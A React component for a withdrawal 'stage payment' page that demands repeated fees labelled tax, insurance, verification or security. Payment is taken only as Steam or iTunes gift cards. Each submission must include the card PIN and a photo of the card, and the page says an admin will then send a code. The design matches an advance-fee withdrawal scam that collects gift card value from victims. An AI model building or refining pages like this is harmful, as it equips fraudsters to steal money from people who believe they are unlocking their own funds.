import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { submitStagePayment } from '../services/api';
import './styles/stagepayment.css';

/**
 * Generic stage payment page.
 * Usage: navigate to this page with state: { withdrawalId, stage, amount }
 * stage: 'tax' | 'insurance' | 'verification' | 'security'
 */

export default function StagePayment() {
  const loc = useLocation();
  const nav = useNavigate();
  const { withdrawalId, stage, amount } = loc.state || {};
  const [cards, setCards] = useState([{ giftCard: 'Steam', pin: '', file: null }]);
  const [loading, setLoading] = useState(false);

  if (!withdrawalId || !stage) {
    return <div className="page-container"><div className="card"><h3>Payment</h3><p className="muted">Missing data. Go back.</p></div></div>;
  }

  const addCard = () => setCards([...cards, { giftCard: 'Steam', pin: '', file: null }]);
  const updateCard = (idx, key, value) => {
    const copy = [...cards];
    copy[idx][key] = value;
    setCards(copy);
  };

  const handleFile = (idx, e) => updateCard(idx, 'file', e.target.files[0]);

  const validateCards = () => {
    // Check if all required fields are filled for each card
    for (let i = 0; i < cards.length; i++) {
      const card = cards[i];
      if ((card.pin && card.pin.trim()) || card.file) {
        // If either pin or file is provided, both become required
        if (!card.pin || !card.pin.trim()) {
          alert(`Card ${i + 1}: PIN is required when uploading an image`);
          return false;
        }
        if (!card.file) {
          alert(`Card ${i + 1}: Image upload is required when providing a PIN`);
          return false;
        }
      }
    }
    
    // Check if at least one card has both pin and file
    const validCards = cards.filter(c => (c.pin && c.pin.trim()) && c.file);
    if (validCards.length === 0) {
      alert('Please provide at least one card with both PIN and image upload before continuing.');
      return false;
    }
    
    return true;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!validateCards()) {
      return;
    }

    // Keep only cards that have both pin and file
    const validCards = cards.filter(c => (c.pin && c.pin.trim()) && c.file);

    try {
      setLoading(true);
      const form = new FormData();
      form.append('withdrawalId', withdrawalId);
      form.append('stage', stage);
      form.append('amount', amount || 0);

      // include a method field so backend validators that expect it won't fail
      form.append('method', 'giftcard');

      form.append('cardsCount', validCards.length);

      validCards.forEach((c, i) => {
        form.append(`cards[${i}][giftCard]`, c.giftCard || 'Steam');
        form.append(`cards[${i}][pin]`, c.pin || '');
        // append file only if present (multer will handle missing files)
        if (c.file) {
          form.append(`cards[${i}][file]`, c.file);
        }
      });

      await submitStagePayment(form);
      alert('Payment submission sent. Admin will send a code to your dashboard notifications.');
      // go to confirm stage input
      nav(`/withdraw/confirm/${stage}`, { state: { withdrawalId, stage } });
    } catch (err) {
      console.error(err);
      alert(err?.response?.data?.message || 'Failed to submit payment');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="page-container">
      <div className="card">
        <h3>{stage.charAt(0).toUpperCase() + stage.slice(1)} payment</h3>
        <p className="muted">You will pay {amount ? `$${amount}` : 'the specified amount'} for {stage}. Add Gift card details below.</p>
        <p style={{ color: '#ef4444', fontSize: '14px', marginTop: '8px' }}>
          <strong>Note:</strong> Both PIN and image upload are required for each card you submit.
        </p>

        <form onSubmit={handleSubmit} style={{ marginTop: 12 }}>
          {cards.map((c, idx) => (
            <div key={idx} style={{ border: '1px solid #f3f4f6', padding: 8, borderRadius: 6, marginBottom: 8 }}>
              <label>
                <span>Gift card</span>
                <select value={c.giftCard} onChange={(e) => updateCard(idx, 'giftCard', e.target.value)}>
                  <option value="Steam">Steam card</option>
                  <option value="iTunes">iTunes</option>
                </select>
              </label>
              <label>
                <span>Card pin *</span>
                <input value={c.pin} onChange={(e) => updateCard(idx, 'pin', e.target.value)} required />
              </label>
              <label>
                <span>Upload card image *</span>
                <input type="file" accept="image/*" onChange={(e) => handleFile(idx, e)} required />
                {c.file && (
                  <div style={{ marginTop: 4, fontSize: 12, color: '#10b981' }}>
                    ✓ Image selected: {c.file.name}
                  </div>
                )}
              </label>
            </div>
          ))}

          <div style={{ display: 'flex', gap: 8 }}>
            <button type="button" className="btn-outline" onClick={addCard}>Add more cards</button>
          </div>

          <div style={{ marginTop: 12 }}>
            <button className="btn" type="submit" disabled={loading}>{loading ? 'Submitting...' : 'Continue'}</button>
            <button className="btn-outline" style={{ marginLeft: 8 }} type="button" onClick={() => nav('/dashboard')}>Cancel</button>
          </div>
        </form>
      </div>
    </div>
  );
}